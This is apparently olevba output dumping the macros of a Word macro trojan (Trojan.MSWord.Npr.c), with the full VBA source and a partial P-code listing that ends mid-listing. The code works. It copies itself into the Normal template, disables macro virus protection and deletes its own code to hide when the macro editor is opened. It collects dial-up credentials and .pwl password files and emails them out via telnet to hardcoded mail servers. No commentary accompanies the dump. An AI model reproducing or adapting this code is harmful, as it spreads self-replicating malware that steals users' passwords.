olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Npr.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Npr.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPlus.bas 
in file: Trojan.MSWord.Npr.c - OLE stream: 'Macros/VBA/MSPlus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hWnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias _
"FindWindowA" (ByVal lpClassName As Any, _
ByVal lpWindowName As Any) As Long
Sub AutoOpen()
Dim Yes As Boolean
Dim Source As String
Dim VBComponent As Object
On Error Resume Next
ActiveDocument.ShowSpellingErrors = False
ActiveDocument.ShowGrammaticalErrors = False
Source = MacroContainer.FullName
Yes = False
For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPlus" Then
  Yes = True
 End If
Next
 If Yes = False Then
 CopyModule NormalTemplate.FullName, Source
 End If
  Options.VirusProtection = False
 Options.SaveNormalPrompt = False
 NormalTemplate.Save
End Sub
Sub CopyModule(Target As String, Source_ As String)
Dim VBComponent As Object
On Error Resume Next
Application.OrganizerCopy _
  Source:=Source_, _
  Destination:=Target, _
  Name:="MSPlus", _
  Object:=wdOrganizerObjectProjectItems
For Each VBComponent In MacroContainer.VBProject.VBComponents
  If VBComponent.Name <> "ThisDocument" Then
   Application.OrganizerCopy _
    Source:=Source_, _
    Destination:=Target, _
    Name:=VBComponent.Name, _
    Object:=wdOrganizerObjectProjectItems
 End If
Next

End Sub
Sub AutoExit()
Application.Visible = False
Tmsn
End Sub
Sub FileOpen()
AutoOpen
Dialogs(80).Show
Tmsn
End Sub
Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Tmsn
End Sub
Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub
Sub AutoClose()
AutoOpen
End Sub
Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open "c:\windows\logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Sub Sender()
Dim Handle As Long
Dim HandleBW As Long
Dim hWnd As Long
Dim FileName As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 5) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim TWnd As String
Dim None As String
On Error Resume Next
If Chkip > 400 Then
Host(1) = "chat.ru"
Host(2) = "mail.iname.com"
Host(3) = "194.186.182.26"
Host(4) = "195.75.32.20"
Host(5) = "194.67.1.159"
Loto 5, A()
For f = 1 To 5
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
  If THwnd <> 0 Then
    TWnd = "telnet"
    None = "(none)"
   Else
   THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
   If THwnd <> 0 Then
   TWnd = "Òåëíåò - "
    None = "(íåò)"
    Else
   THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
   TWnd = "telnet - "
    None = "(íåò)"
  End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 60 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), TWnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), "Connect failed")
 DoEvents
Loop
Select Case Handle
  Case Is <> 0
SMTP = "helo selena#$mail from: <cookie@mail.ru>#rcpt to: <kashek@usa.net>#$data#$Date: " + _
 Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
 + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
Filler SMTP, Handle
Pause 1
Grab FileName
SMTP = Base64(FileName)
Kill "c:\windows\" + FileName
SMTP = Adapt(SMTP)
Filler SMTP, Handle
Pause 1
FindPWL i, NPwl()
If i <> 0 Then
 For j = 0 To i - 1
  If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
   SMTP = Base64(NPwl(j))
   SMTP = Adapt(SMTP)
      Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
   + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
   NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
   + Chr(34) + NPwl(j) + Chr(34) + "#"
      Filler Title, Handle
   Pause 1
   Filler SMTP, Handle
   Pause 1
  End If
 Next
End If
Title = "##------=_NextPart--#.#quit#"
Filler Title, Handle
Pause 1
Start = Timer
Do Until hWnd <> 0 Or Timer - Start > 150
 hWnd = FindWindow(CLng(0), TWnd)
 DoEvents
Loop
Select Case hWnd
Case Is = 0
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hWnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open "c:\windows\logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), TWnd + " - " + None)
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Handle = 0
End Select
Next
End If
End Sub
Function Chkip()
Dim hWnd As Long
Dim Start As Long
Dim A As Long
Dim i As Long
Dim NF As Integer
Dim NF1 As Integer
On Error Resume Next
NF = FreeFile
Open "c:\windows\chkip.bat" For Output Access Write As #NF
Print #NF, "route print > c:\windows\chkip.bmp"
Close #NF
Shell "c:\windows\chkip.bat", 0
Start = Timer
 Do While FindWindow(CLng(0), "(Ñåàíñ çàâåðøåí) - chkip") = 0
        DoEvents
        If Timer > Start + 10 Then
         Exit Function
        End If
 Loop
hWnd = FindWindow(CLng(0), "(Ñåàíñ çàâåðøåí) - chkip")
SendMessage hWnd, CLng(16), ByVal CLng(0), 0
Chkip = FileLen("c:\windows\chkip.bmp")
A = 255
NF = FreeFile
Open "c:\windows\chkip.bat" For Binary Access Write As #NF
NF1 = FreeFile
Open "c:\windows\chkip.bmp" For Binary Access Write As #NF1
For i = 1 To LOF(NF)
 Put #NF, i, A
Next
For i = 1 To LOF(NF1)
 Put #NF1, i, A
Next
Close #NF
Close #NF1
Kill "c:\windows\chkip.bat"
Kill "c:\windows\chkip.bmp"
End Function
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next

End Function
Sub Filler(MessStr As String, hWnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hWnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
   Charset = SendMessage(hWnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub
Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Function Grab(Name As String)
Dim Tmp As String
Dim AZ As String
Dim i As Integer
Dim Num As Integer
Dim PwdLst As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
Dim NF1 As Integer
AZ = "abcdifghijklmnopqastuvwxyz"
For i = 1 To 7
 Num = Random1(25)
 Name = Name + Mid(AZ, Num + 1, 1)
Next
Name = Name + ".egn"
On Error Resume Next
NF1 = FreeFile
Open "c:\windows\" + Name For Output Access Write As #NF1
If Dir$("c:\windows\edialer.ini") <> "" Then
NF = FreeFile
Open "c:\windows\edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Print #NF1, Tmp
  End If
Loop
Close #NF
End If
If Dir$("C:\Windows\system.ini") <> "" Then
NF = FreeFile
Open "C:\Windows\system.ini" For Input Access Read As #NF
Do While Not EOF(NF)
 Line Input #NF, Temp
 Counter = Counter + 1
 If Temp = "[Password Lists]" Then
  Do While Temp <> ""
  Line Input #NF, Temp
  PwdLst = PwdLst + Chr(10) + Temp
  Loop
 Exit Do
 End If
   If Counter Mod 20 = 0 Then
   DoEvents
   End If
Loop
End If
Close #NF
Print #NF1, PwdLst
Close #NF1
End Function
Function Base64(FName As String)
Dim i As Long
Dim ABC As String
Dim Tmp As String
Dim Char As Byte
Dim Cod As Integer
Dim Roll As Integer
Dim Counter As Long
'
Dim HMask As Integer
Dim LMask As Integer
Dim Shift As Integer
Dim NF As Integer


HMask = 252
LMask = 3
Shift = 16
Roll = 0
Counter = 1
ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
NF = FreeFile
On Error Resume Next
Open "c:\windows\" + FName For Binary Access Read As #NF
For i = 1 To LOF(NF)
Get #NF, Counter, Char
Cod = ((Char And HMask) \ (LMask + 1)) Or Roll
Roll = (Char And LMask) * Shift
Tmp = Tmp + Mid$(ABC, Cod + 1, 1)
HMask = HMask * 4 And 255
LMask = LMask * 4 + 3
Shift = Shift \ 4
If HMask = 0 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
 HMask = 252
 LMask = 3
 Shift = 16
 Roll = 0
End If
Counter = Counter + 1
Next
Close #NF
If Shift < 16 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
End If
Cod = ((Len(Tmp)) Mod 4)
If Cod Then
Tmp = Tmp + String$(4 - Cod, "=")
End If
Base64 = Tmp
End Function
Function FindPWL(j As Integer, FindFiles() As String)
ReDim FindFiles(0)
FindFiles(0) = Dir$("c:\windows\*.pwl")
If FindFiles(0) = "" Then
Exit Function
End If
j = 0
Do While FindFiles(0) <> ""
FindFiles(0) = Dir
j = j + 1
Loop
If j > 1 Then
ReDim FindFiles(0 To j - 1)
FindFiles(0) = Dir$("c:\windows\*.pwl")
For j = 1 To j - 1
FindFiles(j) = Dir$
Next j
Else
FindFiles(0) = Dir$("c:\windows\*.pwl")
End If
End Function
Function Adapt(Cod As String)
Dim PostCod As String
Dim i As Long
On Error Resume Next
For i = 1 To Len(Cod)
 If i >= 76 And (i Mod 76) = 0 Then
  PostCod = PostCod + Mid(Cod, i, 1) + "#"
  Else
  PostCod = PostCod + Mid(Cod, i, 1)
 End If
Next
Adapt = "#" + PostCod + "#"
End Function
Function Random1(i As Integer)
Dim Resalt As Integer
Resalt = Int(i * Rnd + 1)
Random1 = Resalt
End Function
Sub ViewVBCode()
Deleter
ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
Deleter
Dialogs(wdDialogToolsMacro).Display
End Sub
Sub Deleter()
Dim TempPath As String, TempName As String
Dim Docum As Object
Dim VBComp As Object
On Error Resume Next
For Each VBComp In NormalTemplate.VBProject.VBComponents
 If VBComp.Name <> "ThisDocument" Then
  With NormalTemplate.VBProject.VBComponents(VBComp.Name).CodeModule
    .DeleteLines 1, .CountOfLines
  End With
 Application.OrganizerDelete NormalTemplate.Name, VBComp.Name, wdOrganizerObjectProjectItems
 End If
Next
For Each VBComp In ActiveDocument.VBProject.VBComponents
 Debug.Print VBComp.Name
  If VBComp.Name <> "ThisDocument" Then
   With ActiveDocument.VBProject.VBComponents(VBComp.Name).CodeModule
    .DeleteLines 1, .CountOfLines
   End With
   Application.OrganizerDelete ActiveDocument.Name, VBComp.Name, wdOrganizerObjectProjectItems
   End If
Next
Options.SaveNormalPrompt = True
End Sub
Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub









-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Trojan.MSWord.Npr.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/MSPlus - 23684 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	FuncDefn (Declare Function SendMessage Lib "user32.dll" (ByVal hWnd As Long, ByVal Msg As Long, wParam As , lParam As ) As Long)
' Line #2:
' 	LineCont 0x0008 06 00 00 00 0D 00 00 00
' 	FuncDefn (Declare Function FindWindow Lib "user32.dll" (ByVal lpClassName As , ByVal lpWindowName As ) As Long)
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	Dim 
' 	VarDefn Yes (As Boolean)
' Line #5:
' 	Dim 
' 	VarDefn Source (As String)
' Line #6:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowSpellingErrors 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowGrammaticalErrors 
' Line #10:
' 	Ld MacroContainer 
' 	MemLd FullName 
' 	St Source 
' Line #11:
' 	LitVarSpecial (False)
' 	St Yes 
' Line #12:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #13:
' 	Ld VBComponent 
' 	MemLd New 
' 	LitStr 0x0006 "MSPlus"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitVarSpecial (True)
' 	St Yes 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	StartForVariable 
' 	Next 
' Line #17:
' 	Ld Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #18:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld Source 
' 	ArgsCall CopyModule 0x0002 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #22:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub CopyModule(Target As String, Source_ As String))
' Line #25:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	LineCont 0x0010 03 00 02 00 07 00 02 00 0B 00 02 00 0F 00 02 00
' 	Ld Source_ 
' 	ParamNamed Source 
' 	Ld Target 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "MSPlus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #28:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #29:
' 	Ld VBComponent 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #30:
' 	LineCont 0x0010 03 00 04 00 07 00 04 00 0B 00 04 00 11 00 04 00
' 	Ld Source_ 
' 	ParamNamed Source 
' 	Ld Target 
' 	ParamNamed Destination 
' 	Ld VBComponent 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Next 
' Line #33:
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub AutoExit())
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #37:
' 	ArgsCall Tmsn 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub FileOpen())
' Line #40:
' 	ArgsCall AutoOpen 0x0000 
' Line #41:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #42:
' 	ArgsCall Tmsn 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub FileSave())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #47:
' 	ArgsCall Tmsn 0x0000 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub FileClose())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	ArgsCall AutoOpen 0x0000 
' Line #52:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub AutoClose())
' Line #55:
' 	ArgsCall AutoOpen 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub Tmsn())
' Line #58:
' 	Dim 
' 	VarDefn Delta (As Integer)
' Line #59:
' 	Dim 
' 	VarDefn Old (As Byte)
' Line #60:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #61:
' 	Ld Friend 
' 	St NF 
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #64:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld Old 
' 	GetRec 
' Line #65:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #66:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St Delta 
' Line #67:
' 	Ld Delta 
' 	Ld Old 
' 	Sub 
' 	St Delta 
' Line #68:
' 	Ld Delta 
' 	SelectCase 
' Line #69:
' 	LitDI2 0x0002 
' 	CaseGt 
' 	CaseDone 
' Line #70:
' 	ArgsCall Sender 0x0000 
' Line #71:
' 	LitDI2 0x0000 
' 	Ld Delta 
' 	LitDI2 0x001F 
' 	Add 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	CaseLt 
' 	CaseDone 
' Line #72:
' 	ArgsCall Sender 0x0000 
' Line #73:
' 	CaseElse 
' Line #74:
' 	EndSelect 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub Sender())
' Line #77:
' 	Dim 
' 	VarDefn Handle (As Long)
' Line #78:
' 	Dim 
' 	VarDefn HandleBW (As Long)
' Line #79:
' 	Dim 
' 	VarDefn hWnd (As Long)
' Line #80:
' 	Dim 
' 	VarDefn FileName (As String)
' Line #81:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #82:
' 	Dim 
' 	VarDefn MyDat (As Byte)
' Line #83:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #84:
' 	Dim 
' 	VarDefn NPwl (As String)
' Line #85:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #86:
' 	Dim 
' 	VarDefn Title (As String)
' Line #87:
' 	Dim 
' 	VarDefn SMTP (As String)
' Line #88:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	VarDefn Host (As String)
' Line #89:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #90:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #91:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #92:
' 	Dim 
' 	VarDefn THwnd (As Long)
' Line #93:
' 	Dim 
' 	VarDefn TWnd (As String)
' Line #94:
' 	Dim 
' 	VarDefn None (As String)
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	Ld Chkip 
' 	LitDI2 0x0190 
' 	Gt 
' 	IfBlock 
' Line #97:
' 	LitStr 0x0007 "chat.ru"
' 	LitDI2 0x0001 
' 	ArgsSt Host 0x0001 
' Line #98:
' 	LitStr 0x000E "mail.iname.com"
' 	LitDI2 0x0002 
' 	ArgsSt Host 0x0001 
' Line #99:
' 	LitStr 0x000E "194.186.182.26"
' 	LitDI2 0x0003 
' 	ArgsSt Host 0x0001 
' Line #100:
' 	LitStr 0x000C "195.75.32.20"
' 	LitDI2 0x0004 
' 	ArgsSt Host 0x0001 
' Line #101:
' 	LitStr 0x000C "194.67.1.159"
' 	LitDI2 0x0005 
' 	ArgsSt Host 0x0001 
' Line #102:
' 	LitDI2 0x0005 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #103:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #104:
' 	LitStr 0x0006 "telnet"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #105:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000F "Telnet - (none)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #106:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #107:
' 	LitStr 0x0006 "telnet"
' 	St TWnd 
' Line #108:
' 	LitStr 0x0006 "(none)"
' 	St None 
' Line #109:
' 	ElseBlock 
' Line #110:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Òåëíåò - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #111:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #112:
' 	LitStr 0x0009 "Òåëíåò - "
' 	St TWnd 
' Line #113:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #114:
' 	ElseBlock 
' Line #115:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Telnet - (íåò)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #116:
' 	LitStr 0x0009 "telnet - "
' 	St TWnd 
' Line #117:
' 	LitStr 0x0005 "(íåò)"
' 	St None 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	Ld THwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #121:
' 	LitStr 0x0007 "telnet "
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	LitStr 0x0003 " 25"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #122:
' 	ArgsCall DoEvents 0x0000 
' Line #123:
' 	Ld Timer 
' 	St Start 
' Line #124:
' 	Ld Handle 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x003C 
' 	Gt 
' 	Or 
' 	Ld HandleBW 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	DoUnitil 
' Line #125:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld TWnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #126:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Connect failed"
' 	ArgsLd FindWindow 0x0002 
' 	St HandleBW 
' Line #127:
' 	ArgsCall DoEvents 0x0000 
' Line #128:
' 	Loop 
' Line #129:
' 	Ld Handle 
' 	SelectCase 
' Line #130:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' Line #131:
' 	LineCont 0x0008 04 00 01 00 0B 00 01 00
' 	LitStr 0x0050 "helo selena#$mail from: <cookie@mail.ru>#rcpt to: <kashek@usa.net>#$data#$Date: "
' 	Ld Date$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld Time$ 
' 	Add 
' 	LitStr 0x0080 "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "----=_NextPart"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0084 "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
' 	Add 
' 	St SMTP 
' Line #132:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #133:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #134:
' 	Ld FileName 
' 	ArgsCall Grab 0x0001 
' Line #135:
' 	Ld FileName 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #136:
' 	LitStr 0x000B "c:\windows\"
' 	Ld FileName 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #137:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #138:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #139:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #140:
' 	Ld i 
' 	ArgsLd NPwl 0x0000 
' 	ArgsCall FindPWL 0x0002 
' Line #141:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #142:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #143:
' 	LitStr 0x000B "c:\windows\"
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x02B0 
' 	Ne 
' 	IfBlock 
' Line #144:
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #145:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #146:
' 	LineCont 0x000C 08 00 03 00 15 00 03 00 1B 00 03 00
' 	LitStr 0x003F "#------=_NextPart#Content-Type: application/octet-stream; name="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0038 "#Content-Transfer-Encoding: base64#Content-Description: "
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitStr 0x003E "(PWL PassWord List)#Content-Disposition: attachment; filename="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Title 
' Line #147:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #148:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #149:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #150:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #151:
' 	EndIfBlock 
' Line #152:
' 	StartForVariable 
' 	Next 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	LitStr 0x001C "##------=_NextPart--#.#quit#"
' 	St Title 
' Line #155:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #156:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #157:
' 	Ld Timer 
' 	St Start 
' Line #158:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0096 
' 	Gt 
' 	Or 
' 	DoUnitil 
' Line #159:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld TWnd 
' 	ArgsLd FindWindow 0x0002 
' 	St hWnd 
' Line #160:
' 	ArgsCall DoEvents 0x0000 
' Line #161:
' 	Loop 
' Line #162:
' 	Ld hWnd 
' 	SelectCase 
' Line #163:
